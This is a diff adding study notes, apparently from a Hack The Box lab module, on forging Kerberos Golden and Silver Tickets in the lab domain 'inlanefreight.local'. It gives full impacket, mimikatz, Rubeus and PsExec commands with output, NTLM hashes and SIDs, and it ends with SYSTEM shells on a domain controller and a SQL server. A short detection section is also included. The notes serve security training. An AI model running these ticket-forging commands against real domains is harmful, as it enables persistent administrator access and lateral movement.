@@ -2178,3 +2178,276 @@ Cached Tickets: (2)
         Kdc Called: DC01
 ```
 
+### Linux
+
+On the Linux side, `impacket` can be used to craft a Golden Ticket. [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) will help you retrieve the domain SID and every group and user SID.
+
+```bash
+d41y@htb[/htb]$ lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Brute forcing SIDs at dc01.inlanefreight.local
+[*] StringBinding ncacn_np:dc01.inlanefreight.local[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2974783224-3764228556-2640795941
+498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: INLANEFREIGHT\Administrator (SidTypeUser)
+501: INLANEFREIGHT\Guest (SidTypeUser)
+502: INLANEFREIGHT\krbtgt (SidTypeUser)
+503: INLANEFREIGHT\DefaultAccount (SidTypeUser)
+512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
+513: INLANEFREIGHT\Domain Users (SidTypeGroup)
+<SNIP>
+```
+
+Once you have the domain SID, you can craft a Golden Ticket using [ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py).
+
+```bash
+d41y@htb[/htb]$ ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local Administrator
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for inlanefreight.local/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncASRepPart
+[*] Saving ticket in Administrator.ccache
+```
+
+The ticket has been forged and saved in the current directory as `Administrator.ccache`. You can now use this ticket by importing it in `KRB5CCNAME` environment variable and using any impacket tool with the `-k` parameter.
+
+```bash
+d41y@htb[/htb]$ export KRB5CCNAME=./Administrator.ccache
+d41y@htb[/htb]$ psexec.py -k -no-pass dc01.inlanefreight.local
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on dc01.inlanefreight.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file WVkWAnvd.exe
+[*] Opening SVCManager on dc01.inlanefreight.local.....
+[*] Creating service pmfM on dc01.inlanefreight.local.....
+[*] Starting service pmfM.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+#### Detection
+
+This type of persistence is challenging to detect because Golden Tickets are valid TGTs. Windows event logs don't distinguish between a legitimate TGT and a maliciously crafted Golden Ticket. Also, resetting the impersonated account's password does not invalidate the ticket.
+
+Golden tickets are usually created with a much longer lifespan than tickets have by default. Certain AD monitoring product can detect these long ticket lifespans as IoCs.
+
+Golden tickets can be detected in a few ways:
+
+- The account DOMAIN field is blank
+- The account DOMAIN field contains DOMAIN FQDN instead of just domain
+
+Once a golden ticket is detected, the `krbtgt` account password must be changed twice to remove the persistence, as the current and previous passwords are stored in the domain. The password of the `krbtgt` account should be changed regularly, as it is an admin account.
+
+## Silver Ticket
+
+Every machine account has an NTLM hash; this is the hash of the computer, represented as the `SYSTEM$` account. This is the PSK between the Domain and Workstation which is used to sign TGS Kerberos tickets. This ticket is less powerful than the TGT, as it can only access that single machine. However, when creating a TGT, the attacker needs to approach the DC to have it generate a TGS ticker before they can access any machines. This creates a unique audit record, which doesn't stand out as malicious, but heuristics can be applied to identify if it is abnormal. When forging a TGS ticket, the attacker can bypass the DC and go straight to the target, minimizing the number of logs left behind.
+
+### Theory
+
+When a user requests a TGS ticket, they send their TGT to the DC. The DC will find out which account exposes the SPN requested by the user. Then it will copy the user's information into the TGS ticket, which it will then encrypt with the secret of the service account associated with the SPN.
+
+Because the user does not know the secret of the service account, they cannot modify their own information in the TGS ticket. But what happens if a user compromises a service account and therefore can know its secret?
+
+The attacker can forge a service ticket from scratch since they can create an arbitrary PAC and encrypt it with the secret token. Once this TGS ticket is forged, the attacker presents it to the service. The service can decrypt it because it has been encrypted with its own password, and then it will read the contents of the PAC. As the attacker has forged it, they can embed whatever information they desire, such as being a domain administrator. This forged ticket is called a Silver Ticket.
+
+To forge a Silver Ticket, an attacker requires the NTLM password's hash or keys for a service or machine account, the SID of the domain, a target host, a service name, an arbitrary username, and group information. Silver tickets can be created for any existing or non-existing user account.
+
+The ticket can be forged using `Mimikatz` or `impacket` and the get injected into memory to access a target service remotely. A Silver Ticket is a forged TGS ticket, so using one does not require communication with the DC. Any associated event logs are created on the target host. Therefore, Silver Tickets are more stealthy than Golden Tickets.
+
+#### Windows
+
+Different elements are needed to forge a Silver Ticket. First, you need the domain's SID. This piece of information can be retrieved using PowerView's `Get-DomainSID` function.
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainSID
+
+S-1-5-21-2974783224-3764228556-2640795941
+```
+
+You also must have compromised a service account to get its NTLM hash. You must also specify an SPN because a TGS ticket is always generated for one SPN only. You can use `mimikatz` to forge a Silver Ticket when you have this information.
+
+Say you compromised the `SQL01$` account. You have its NTLM hash. You want to craft a TGS ticket to access the `SQL01` filesystem. You'll need a `CIFS/SQL01` TGS ticket to do so.
+
+```powershell
+PS C:\Tools> mimikatz.exe 
+
+<SNIP>
+
+mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs  /ptt
+
+User      : Administrator
+Domain    : inlanefreight.local (INLANEFREIGHT)
+SID       : S-1-5-21-2974783224-3764228556-2640795941
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: ff955e93a130f5bb1a6565f32b7dc127 - rc4_hmac_nt
+Service   : cifs
+Target    : sql01.inlanefreight.local
+Lifetime  : 8/17/2020 3:22:27 PM ; 8/15/2030 3:22:27 PM ; 8/15/2030 3:22:27 PM
+-> Ticket : ` Pass The Ticket `
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ inlanefreight.local' successfully submitted for current session
+```
+
+As you can see on the last line, the Silver Ticket has been created and submitted for the current session. Mimikatz calls it a Golden Ticket, but it's a TGS ticket that was generated, so it is a Silver Ticket. You can double-check this using `klist`.
+
+```powershell
+PS C:\Tools> klist
+
+Current LogonId is 0:0x3f22d82
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ inlanefreight.local
+        Server: cifs/sql01.inlanefreight.local @ inlanefreight.local
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+        Start Time: 8/17/2020 15:22:27 (local)
+        End Time:   8/15/2030 15:22:27 (local)
+        Renew Time: 8/15/2030 15:22:27 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+```
+
+Now that you have a ticket to access the `SQL01` filesystem, you can use the `dir` utility.
+
+```powershell
+PS C:\Tools> dir //sql01.inlanefreight.local/c$
+
+    Directory: \\sql01.inlanefreight.local\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        7/27/2020   9:24 PM                DB_backups
+d-----        7/16/2016   9:23 AM                PerfLogs
+d-r---        7/30/2020   9:59 PM                Program Files
+d-----        7/30/2020   9:59 PM                Program Files (x86)
+d-----        7/27/2020   9:03 PM                StorageReports
+d-----        8/14/2020  10:54 PM                Tools
+d-r---        8/14/2020   7:06 AM                Users
+d-----        7/25/2020   8:20 PM                Windows
+```
+
+You can also create a sacrificial process.
+
+```powershell
+C:\Tools> mimikatz.exe "kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs /ticket:sql01.kirbi" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs /ticket:sql01.kirbi
+User      : Administrator
+Domain    : inlanefreight.local (INLANEFREIGHT)
+SID       : S-1-5-21-2974783224-3764228556-2640795941
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: ff955e93a130f5bb1a6565f32b7dc127 - rc4_hmac_nt
+Service   : cifs
+Target    : sql01.inlanefreight.local
+Lifetime  : 4/4/2023 3:10:29 PM ; 4/1/2033 3:10:29 PM ; 4/1/2033 3:10:29 PM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ inlanefreight.local' successfully submitted for current session
+
+mimikatz(commandline) # exit
+Bye!
+```
+
+```
+C:\Tools> Rubeus.exe createnetonly /program:cmd.exe /show
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+[*] Action: Create Process (/netonly)
+
+
+[*] Using random username and password.
+
+[*] Showing process : True
+[*] Username        : 0HK7610O
+[*] Domain          : 540GDGRA
+[*] Password        : ZM83YNND
+[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 2832
+[+] LUID            : 0x186a73
+```
+
+This Rubeus action [createnetonly](https://academy.hackthebox.com/app/module/25/section/146#:~:text=C%3A%5CTools,0x186a73) and the flag `/show`, will open the program you specify for `/program:`, in this case, `cmd.exe`. That new window is your sacrificial process, as it doesn't have the creds of your current user. You will import the `sql01.kirbi` ticket you forged with mimikatz using this window as follow:
+
+```
+C:\Tools> Rubeus.exe ptt /ticket:sql01.kirbi
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+```
+
+```
+C:\Tools> PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
+
+PsExec v2.42 - Execute processes remotely
+Copyright (C) 2001-2023 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>hostname
+SQL01
+```
